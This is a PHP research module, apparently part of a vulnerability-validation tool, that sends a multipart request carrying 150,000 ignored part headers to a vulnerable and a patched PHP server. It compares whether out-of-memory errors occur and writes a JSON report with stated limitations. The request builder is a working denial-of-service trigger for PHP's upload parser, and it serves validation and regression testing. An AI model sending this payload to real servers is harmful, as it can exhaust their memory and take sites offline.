<?php
/**
 * php2shell validation module: multipart request-parsing OOM differential.
 *
 * This is a bounded research probe, not an exploit. It sends the upstream
 * regression shape (a part with 150,000 ignored header lines) to a vulnerable
 * and a patched target, and records the observed availability behavior.
 *
 * It does not implement heap grooming, memory disclosure, or code execution,
 * and it never emits an execution claim.
 */

declare(strict_types=1);

function env_string(string $name, string $default = ''): string
{
    $value = getenv($name);
    return $value === false ? $default : (string) $value;
}

function utc_now(): string
{
    return gmdate('Y-m-d\TH:i:s\Z');
}

function sha256_bytes(string $data): string
{
    return hash('sha256', $data);
}

function write_file(string $path, string $data): void
{
    $dir = dirname($path);
    if (!is_dir($dir) && !mkdir($dir, 0777, true) && !is_dir($dir)) {
        throw new RuntimeException("cannot create directory: $dir");
    }
    if (file_put_contents($path, $data) === false) {
        throw new RuntimeException("cannot write: $path");
    }
}

/**
 * Build the multipart body used by the upstream oom_rfc1867_header_count test
 * and by the repository's lab-repro probe.
 */
function build_multipart(string $path, string $boundary): void
{
    $fh = fopen($path, 'wb');
    if ($fh === false) {
        throw new RuntimeException("cannot open $path for writing");
    }

    $part = static function (string $name, string $value, string $extra = '') use ($fh, $boundary): void {
        fwrite(
            $fh,
            "--$boundary\r\n"
            . "Content-Disposition: form-data; name=\"$name\"\r\n"
            . $extra
            . "\r\n"
            . $value
            . "\r\n"
        );
    };

    // The advisory's early-consumer path needs the session id and progress key
    // before the large part. The progress value is deliberately short.
    $part('PHPSESSID', 'abcdef0123456789abcdef0123456789');
    $part('PHP_SESSION_UPLOAD_PROGRESS', 'k');

    fwrite($fh, "--$boundary\r\n");
    // 8.4.26 stores every ignored header line; the patch keeps only
    // Content-Disposition / Content-Type, which removes the allocation blow-up.
    for ($i = 0; $i < 150000; $i++) {
        fwrite($fh, "X-$i: v\r\n");
    }
    fwrite($fh, "Content-Disposition: form-data; name=\"f\"\r\n\r\nv\r\n");
    fwrite($fh, "--$boundary--\r\n");
    fclose($fh);
}

/**
 * @return array{body:string,status:int,errno:int,error:string,elapsed_ms:int}
 */
function send_multipart(string $url, string $body, string $boundary, int $timeout): array
{
    $started = microtime(true);
    $ch = curl_init($url);
    if ($ch === false) {
        return [
            'body' => '',
            'status' => 0,
            'errno' => -1,
            'error' => 'curl_init failed',
            'elapsed_ms' => 0,
        ];
    }

    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $body,
        CURLOPT_HTTPHEADER => [
            'Expect:',
            "Content-Type: multipart/form-data; boundary=$boundary",
        ],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => false,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT => $timeout,
    ]);

    $response = curl_exec($ch);
    $status = (int) curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
    $errno = (int) curl_errno($ch);
    $error = (string) curl_error($ch);
    curl_close($ch);

    return [
        'body' => $response === false ? '' : (string) $response,
        'status' => $status,
        'errno' => $errno,
        'error' => $error,
        'elapsed_ms' => (int) round((microtime(true) - $started) * 1000),
    ];
}

function has_oom(string $text): bool
{
    return (bool) preg_match('/Allowed memory size of \d+ bytes exhausted/i', $text);
}

function is_normal_probe(string $body): bool
{
    $decoded = json_decode($body, true);
    return is_array($decoded) && ($decoded['probe'] ?? null) === 'lab-reproduction';
}

function version_hint(string $body, string $fallback): string
{
    $decoded = json_decode($body, true);
    if (is_array($decoded) && is_string($decoded['php_version'] ?? null) && $decoded['php_version'] !== '') {
        return $decoded['php_version'];
    }
    return $fallback;
}

try {
    $out = rtrim(env_string('P2S_OUTPUT_DIR', '/out'), '/');
    $target = env_string('P2S_TARGET_URL');
    $control = env_string('P2S_CONTROL_URL');
    $asset = env_string('P2S_ASSET', 'unknown');
    $nonce = env_string('P2S_NONCE');
    $targetVersion = env_string('P2S_TARGET_VERSION', 'unknown');
    $controlVersion = env_string('P2S_CONTROL_VERSION', 'unknown');
    $timeout = max(5, (int) env_string('P2S_TIMEOUT_SECONDS', '60'));

    if ($target === '' || $control === '') {
        throw new RuntimeException('P2S_TARGET_URL and P2S_CONTROL_URL are required');
    }
    if (!is_dir("$out/raw") && !mkdir("$out/raw", 0777, true) && !is_dir("$out/raw")) {
        throw new RuntimeException("cannot create $out/raw");
    }

    $startedAt = utc_now();
    $boundary = '---------------------------p2s-module-' . substr(hash('sha256', $nonce), 0, 16);
    $bodyPath = "$out/raw/request.multipart";
    build_multipart($bodyPath, $boundary);

    $body = (string) file_get_contents($bodyPath);
    $bodySha = sha256_bytes($body);
    $bodyBytes = strlen($body);

    $vulnerable = send_multipart($target, $body, $boundary, $timeout);
    $patched = send_multipart($control, $body, $boundary, $timeout);

    write_file("$out/raw/vulnerable.response", $vulnerable['body']);
    write_file("$out/raw/patched.response", $patched['body']);

    $vOom = has_oom($vulnerable['body']);
    $pOom = has_oom($patched['body']);
    $vNormal = is_normal_probe($vulnerable['body']);
    $pNormal = is_normal_probe($patched['body']);
    $differential = $vOom && !$pOom && $pNormal;

    $finishedAt = utc_now();

    $request = static function (string $role, string $url, array $response) use ($bodySha, $bodyBytes): array {
        $excerpt = preg_replace('/\s+/', ' ', strip_tags($response['body']));
        $excerpt = is_string($excerpt) ? trim($excerpt) : '';
        return [
            'role' => $role,
            'method' => 'POST',
            'url' => $url,
            'body_sha256' => $bodySha,
            'body_bytes' => $bodyBytes,
            'response_status' => $response['status'],
            'response_sha256' => sha256_bytes($response['body']),
            'response_bytes' => strlen($response['body']),
            'response_excerpt' => substr($excerpt, 0, 320),
            'curl_errno' => $response['errno'],
            'curl_error' => $response['error'],
            'elapsed_ms' => $response['elapsed_ms'],
        ];
    };

    $result = [
        'kind' => 'validation-module-result',
        'schema' => 1,
        'module' => [
            'id' => 'oom-differential',
            'version' => '1.0.0',
            'synthetic' => false,
        ],
        'status' => 'completed',
        'asset' => $asset,
        'nonce' => $nonce,
        'started_at' => $startedAt,
        'finished_at' => $finishedAt,
        'targets' => [
            'vulnerable' => [
                'url' => $target,
                'php_version' => version_hint($vulnerable['body'], $targetVersion),
            ],
            'patched' => [
                'url' => $control,
                'php_version' => version_hint($patched['body'], $controlVersion),
            ],
        ],
        'claims' => [
            // The module's ceiling is crash-oom. The classifier may downgrade
            // this, but never promote it to memory safety or execution.
            'impact' => $differential ? 'crash-oom' : 'inconclusive',
            'execution_effects' => [],
            'oom_observed' => $vOom,
            'control_oom_observed' => $pOom,
            'normal_observed' => $vNormal,
            'control_normal_observed' => $pNormal,
            'differential' => $differential,
        ],
        'requests' => [
            $request('vulnerable', $target, $vulnerable),
            $request('patched', $control, $patched),
        ],
        'artifacts' => [
            [
                'path' => 'raw/request.multipart',
                'role' => 'both',
                'kind' => 'request-body',
                'sha256' => $bodySha,
                'bytes' => $bodyBytes,
            ],
            [
                'path' => 'raw/vulnerable.response',
                'role' => 'vulnerable',
                'kind' => 'response',
                'sha256' => sha256_bytes($vulnerable['body']),
                'bytes' => strlen($vulnerable['body']),
            ],
            [
                'path' => 'raw/patched.response',
                'role' => 'patched',
                'kind' => 'response',
                'sha256' => sha256_bytes($patched['body']),
                'bytes' => strlen($patched['body']),
            ],
        ],
        'observed_effects' => [
            'vulnerable' => [
                'http_status' => $vulnerable['status'],
                'oom_observed' => $vOom,
                'normal_probe_observed' => $vNormal,
                'request_shape' => '150000 ignored multipart part headers',
                'elapsed_ms' => $vulnerable['elapsed_ms'],
            ],
            'patched' => [
                'http_status' => $patched['status'],
                'oom_observed' => $pOom,
                'normal_probe_observed' => $pNormal,
                'request_shape' => '150000 ignored multipart part headers',
                'elapsed_ms' => $patched['elapsed_ms'],
            ],
        ],
        'evidence' => [],
        'limitations' => [
            'This module measures request-parsing OOM behavior only; it does not implement heap grooming, memory disclosure, or code execution.',
            'The 150,000-header body is the upstream regression shape; an OOM is an availability observation, not proof of memory corruption or RCE.',
            'A patched control that returns normally is a negative control, not proof that every exploitation path is closed.',
            'Only Apache/mod_php is exercised; FPM, FrankenPHP, and LSAPI are not covered by this module.',
        ],
    ];

    write_file("$out/module-result.json", json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) . "\n");
    exit(0);
} catch (Throwable $error) {
    $out = rtrim(env_string('P2S_OUTPUT_DIR', '/out'), '/');
    $failure = [
        'kind' => 'validation-module-result',
        'schema' => 1,
        'module' => [
            'id' => 'oom-differential',
            'version' => '1.0.0',
            'synthetic' => false,
        ],
        'status' => 'failed',
        'asset' => env_string('P2S_ASSET', 'unknown'),
        'nonce' => env_string('P2S_NONCE'),
        'error' => $error->getMessage(),
        'claims' => ['impact' => 'inconclusive', 'execution_effects' => []],
        'artifacts' => [],
        'limitations' => ['The module failed before producing a valid result: ' . $error->getMessage()],
    ];
    @write_file("$out/module-result.json", json_encode($failure, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) . "\n");
    fwrite(STDERR, 'oom-differential failed: ' . $error->getMessage() . "\n");
    exit(3);
}
